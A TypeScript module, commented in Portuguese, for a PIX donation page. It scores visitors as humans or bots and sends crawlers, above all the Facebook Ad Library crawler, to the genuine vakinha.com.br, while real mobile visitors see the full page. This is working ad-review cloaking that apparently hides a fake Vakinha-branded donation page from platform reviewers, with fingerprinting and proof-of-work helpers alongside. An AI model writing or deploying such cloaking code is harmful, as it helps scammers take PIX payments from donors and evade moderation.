/**
 * Módulo de segurança para a página de doações PIX.
 * Decisão em camadas (humanScore + botScore), delay de verificação humana,
 * allowlist de navegadores reais, safe mode. Regra: NUNCA redirecionar em dúvida.
 */

/** User-Agents de crawlers/bots/scrapers (não inclui navegadores reais) */
const BOT_UA_PATTERNS = [
  "facebookexternalhit",
  "facebot",
  "googlebot",
  "bingbot",
  "crawler",
  "spider",
  "scraper",
  "slurp",
  "duckduckbot",
  "headlesschrome",
  "phantomjs",
  "selenium",
  "puppeteer",
  "playwright",
  "curl",
  "wget",
  "python-requests",
  "go-http-client",
  "java/",
  "whatsapp",
  "telegrambot",
  "twitterbot",
  "linkedinbot",
  "discordbot",
  "slackbot",
];

/** Padrões UA de navegadores móveis reais (allowlist: permitir automaticamente) */
const ALLOWLIST_UA_PATTERNS = [
  /Chrome\/[\d.]+.*Mobile/i,
  /CriOS\/[\d.]+/i,
  /Safari\/[\d.]+.*(iPhone|iPad|iPod)/i,
  /SamsungBrowser\/[\d.]+/i,
  /Firefox\/[\d.]+.*Mobile/i,
  /FxiOS\/[\d.]+/i,
  /EdgA?\/[\d.]+.*Mobile/i,
  /Version\/[\d.]+.*Safari.*Mobile/i,
];

const REDIRECT_CLOAK_URL = "https://www.vakinha.com.br/";

const HUMAN_SCORE_THRESHOLD = 3;
const BOT_SCORE_REDIRECT_THRESHOLD = 4;
const DELAY_MIN_MS = 300;
const DELAY_MAX_MS = 1000;

/** Resultado da decisão de cloaking (não exposto na UI). */
export type CloakAction = "redirect" | "full" | "simplified";

export interface CloakDecisionResult {
  action: CloakAction;
  humanScore: number;
  botScore: number;
  reason: string;
  fingerprintHash?: string;
  allowlisted?: boolean;
  interactionDetected?: boolean;
}

/** Armazenamento interno do resultado (para DonationPage usar; não exposto no frontend). */
let cloakDecisionResult: CloakAction = "full";

export function setCloakDecisionResult(action: CloakAction): void {
  cloakDecisionResult = action;
}

export function getCloakDecisionResult(): CloakAction {
  return cloakDecisionResult;
}

/**
 * Navegadores reais comuns em mobile: permitir acesso sem redirecionar.
 * Chrome mobile, Safari iOS, Samsung Internet, Firefox mobile, Edge mobile.
 */
export function isAllowlistedBrowser(): boolean {
  if (typeof navigator === "undefined") return false;
  const ua = navigator.userAgent ?? "";
  return ALLOWLIST_UA_PATTERNS.some((p) => p.test(ua));
}

/**
 * UA é de crawler conhecido (não inclui navegadores reais).
 */
export function isKnownBotUA(): boolean {
  if (typeof navigator === "undefined") return false;
  const ua = (navigator.userAgent ?? "").toLowerCase();
  return BOT_UA_PATTERNS.some((p) => ua.includes(p.toLowerCase()));
}

export function isDesktop(): boolean {
  if (typeof navigator === "undefined") return false;
  const ua = navigator.userAgent ?? "";
  return !/Mobile|Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua);
}

export function isFacebookAdLibraryCrawler(): boolean {
  if (typeof navigator === "undefined") return false;
  const ua = (navigator.userAgent ?? "").toLowerCase();
  return ua.includes("facebookexternalhit") || ua.includes("facebot");
}

export function getCloakRedirectUrl(): string {
  return REDIRECT_CLOAK_URL;
}

/**
 * Sinais positivos de HUMANO (cada um conta 1 ponto).
 */
function getHumanScore(): number {
  if (typeof navigator === "undefined" || typeof window === "undefined") return 0;
  let score = 0;
  const nav = navigator as Navigator & {
    webdriver?: boolean;
    plugins?: { length: number };
    languages?: string[];
    hardwareConcurrency?: number;
    deviceMemory?: number;
  };

  if (nav.plugins != null && nav.plugins.length > 0) score += 1;
  if (nav.languages != null && nav.languages.length > 0) score += 1;
  if (nav.webdriver === false) score += 1;
  if (typeof nav.hardwareConcurrency === "number" && nav.hardwareConcurrency > 1) score += 1;
  if (typeof nav.deviceMemory === "number" && nav.deviceMemory >= 1) score += 1;

  try {
    const canvas = document.createElement("canvas");
    if (canvas.getContext("2d")) score += 1;
  } catch {
    /* no signal */
  }

  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") ?? canvas.getContext("experimental-webgl");
    if (gl) score += 1;
  } catch {
    /* no signal */
  }

  if (typeof window.innerWidth === "number" && window.innerWidth >= 320 && window.innerWidth <= 4320) score += 1;
  if (typeof window.innerHeight === "number" && window.innerHeight >= 200) score += 1;

  const win = window as Window & { chrome?: unknown };
  if (typeof win.chrome !== "undefined") score += 1;

  return Math.min(score, 10);
}

/**
 * Sinais de BOT (cada um conta 1 ponto).
 */
function getBotScore(): number {
  if (typeof navigator === "undefined" || typeof window === "undefined") return 0;
  let score = 0;
  const ua = (navigator.userAgent ?? "").toLowerCase();
  const nav = navigator as Navigator & {
    webdriver?: boolean;
    plugins?: { length: number };
    languages?: string[];
  };

  if (nav.webdriver === true) score += 2;
  if (BOT_UA_PATTERNS.some((p) => ua.includes(p))) score += 2;
  if (nav.plugins?.length === 0 && !/iPhone|iPad|Android/i.test(ua)) score += 1;
  if (nav.languages?.length === 0) score += 1;

  try {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    if (!ctx) score += 1;
  } catch {
    score += 1;
  }

  const win = window as Window & { chrome?: unknown };
  if (/headless|phantom|selenium|puppeteer|playwright/i.test(ua) && typeof win.chrome === "undefined") score += 1;

  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") ?? canvas.getContext("experimental-webgl");
    if (gl) {
      const UNMASKED_RENDERER_WEBGL = 37445;
      const debugInfo = (gl as WebGLRenderingContext & { getParameter?: (p: number) => string }).getParameter?.(UNMASKED_RENDERER_WEBGL);
      if (typeof debugInfo === "string" && (debugInfo === "" || /SwiftShader|llvmpipe|mesa/i.test(debugInfo))) score += 1;
    }
  } catch {
    /* no signal */
  }

  return Math.min(score, 10);
}

/**
 * Delay aleatório entre DELAY_MIN_MS e DELAY_MAX_MS; resolve ao primeiro de:
 * - fim do delay
 * - qualquer interação (scroll, touch, mousemove, focus)
 * Se houver interação, resolve com interactionDetected = true.
 */
function waitForHumanVerificationDelay(): Promise<{ interactionDetected: boolean }> {
  return new Promise((resolve) => {
    const delay = DELAY_MIN_MS + Math.random() * (DELAY_MAX_MS - DELAY_MIN_MS);
    let resolved = false;

    const finish = (interaction: boolean) => {
      if (resolved) return;
      resolved = true;
      resolve({ interactionDetected: interaction });
    };

    const onInteraction = () => finish(true);

    window.addEventListener("scroll", onInteraction, { once: true, passive: true });
    window.addEventListener("touchstart", onInteraction, { once: true, passive: true });
    window.addEventListener("mousemove", onInteraction, { once: true, passive: true });
    window.addEventListener("focus", onInteraction, { once: true });

    setTimeout(() => finish(false), delay);
  });
}

/**
 * Decisão em camadas com delay de verificação humana.
 * Regras: humanoScore >= 3 → full; botScore >= 4 ou Ad Library/desktop claro → redirect;
 * zona cinzenta ou dúvida → permitir (full). Suspeito mas não certo → simplified (safe mode).
 * NUNCA redireciona quando há dúvida.
 */
export async function getCloakDecision(options?: {
  onDecisionLog?: (log: Omit<CloakDecisionResult, "fingerprintHash"> & { fingerprintHash?: string }) => void;
}): Promise<CloakDecisionResult> {
  const result: CloakDecisionResult = {
    action: "full",
    humanScore: 0,
    botScore: 0,
    reason: "allow_default",
  };

  if (typeof window === "undefined" || typeof navigator === "undefined") {
    return result;
  }

  const { interactionDetected } = await waitForHumanVerificationDelay();

  if (interactionDetected) {
    result.humanScore = HUMAN_SCORE_THRESHOLD;
    result.botScore = 0;
    result.reason = "interaction_detected";
    result.interactionDetected = true;
    result.action = "full";
    options?.onDecisionLog?.({ ...result });
    return result;
  }

  const humanScore = getHumanScore();
  const botScore = getBotScore();
  result.humanScore = humanScore;
  result.botScore = botScore;

  if (isAllowlistedBrowser()) {
    result.action = "full";
    result.reason = "allowlisted_browser";
    result.allowlisted = true;
    options?.onDecisionLog?.({ ...result });
    return result;
  }

  if (humanScore >= HUMAN_SCORE_THRESHOLD) {
    result.action = "full";
    result.reason = "human_score_above_threshold";
    options?.onDecisionLog?.({ ...result });
    return result;
  }

  if (isFacebookAdLibraryCrawler()) {
    result.action = "redirect";
    result.reason = "facebook_ad_library_crawler";
    options?.onDecisionLog?.({ ...result });
    return result;
  }

  if (botScore >= BOT_SCORE_REDIRECT_THRESHOLD) {
    result.action = "redirect";
    result.reason = "bot_score_above_threshold";
    options?.onDecisionLog?.({ ...result });
    return result;
  }

  if (isDesktop() && botScore >= 2 && humanScore < 2) {
    result.action = "redirect";
    result.reason = "desktop_low_human_signals";
    options?.onDecisionLog?.({ ...result });
    return result;
  }

  if (botScore >= 2 && humanScore < HUMAN_SCORE_THRESHOLD) {
    result.action = "simplified";
    result.reason = "safe_mode_suspicious";
    options?.onDecisionLog?.({ ...result });
    return result;
  }

  result.action = "full";
  result.reason = "gray_zone_allow";
  options?.onDecisionLog?.({ ...result });
  return result;
}

/**
 * Compatibilidade: retorna true se a decisão foi "simplified" ou se o score legado indicaria simplificado.
 * Usado por DonationPage quando o resultado já foi definido por getCloakDecision em main.tsx.
 */
export function shouldShowSimplifiedDonationPage(): boolean {
  const decided = getCloakDecisionResult();
  if (decided === "simplified") return true;
  if (decided === "full") return false;
  if (decided === "redirect") return true;
  return false;
}

/**
 * Usado apenas pelo script inline em index.html para redirect imediato de crawlers óbvios (UA).
 * Não usa desktop nem delay; apenas UA 100% crawler.
 */
export function shouldRedirectToCloak(): boolean {
  if (typeof navigator === "undefined") return false;
  if (isKnownBotUA()) return true;
  const nav = navigator as Navigator & { webdriver?: boolean };
  if (nav.webdriver === true) return true;
  return false;
}

/**
 * Fingerprint para rate limiting (inalterado).
 */
export async function getBrowserFingerprint(): Promise<string> {
  const parts: string[] = [];

  if (typeof navigator !== "undefined") {
    parts.push(navigator.userAgent ?? "");
    parts.push(navigator.language ?? "");
    parts.push(String(navigator.languages?.length ?? 0));
    parts.push(String(navigator.hardwareConcurrency ?? 0));
    parts.push(String((navigator as Navigator & { deviceMemory?: number }).deviceMemory ?? 0));
    parts.push(String(navigator.platform ?? ""));
  }

  if (typeof Intl !== "undefined") {
    try {
      parts.push(Intl.DateTimeFormat().resolvedOptions().timeZone ?? "");
    } catch {
      parts.push("tz-unknown");
    }
  }

  if (typeof screen !== "undefined") {
    parts.push(`${screen.width}x${screen.height}`);
    parts.push(String(screen.colorDepth ?? 0));
  }

  const canvasHash = await getCanvasFingerprint();
  parts.push(canvasHash);

  const combined = parts.join("|");
  return hashString(combined);
}

async function getCanvasFingerprint(): Promise<string> {
  try {
    const canvas = document.createElement("canvas");
    canvas.width = 200;
    canvas.height = 50;
    const ctx = canvas.getContext("2d");
    if (!ctx) return "no-canvas";

    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(0, 0, 100, 50);
    ctx.fillStyle = "#069";
    ctx.fillText("Vakinha Doação PIX", 2, 15);
    ctx.fillStyle = "rgba(0,0,0,0.5)";
    ctx.fillText("Vakinha Doação PIX", 4, 17);

    const dataUrl = canvas.toDataURL("image/png");
    return hashString(dataUrl);
  } catch {
    return "canvas-err";
  }
}

async function hashString(str: string): Promise<string> {
  const encoder = new TextEncoder();
  const data = encoder.encode(str);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
}

export async function solveProofOfWork(
  nonce: string,
  difficulty: number
): Promise<string> {
  const prefix = "0".repeat(Math.max(0, difficulty));
  let solution = 0;
  const maxAttempts = 5_000_000;

  while (solution < maxAttempts) {
    const candidate = `${nonce}:${solution}`;
    const hashHex = await sha256Hex(candidate);
    if (hashHex.startsWith(prefix)) return String(solution);
    solution++;
  }

  throw new Error("PoW: não foi possível resolver o desafio no limite de tentativas");
}

async function sha256Hex(message: string): Promise<string> {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
}

/** Score de risco legado (0–100) para compatibilidade; decisão real usa getCloakDecision. */
export function getRiskScore(): number {
  if (typeof navigator === "undefined" || typeof window === "undefined") return 0;
  const humanScore = getHumanScore();
  const botScore = getBotScore();
  return Math.min(100, botScore * 15 - humanScore * 5 + 50);
}

export interface PowChallenge {
  nonce: string;
  difficulty: number;
}

export interface DonationSecurityPayload {
  fingerprint: string;
  pow_nonce: string;
  pow_solution: string;
  honeypot?: string;
  page_token?: string;
}
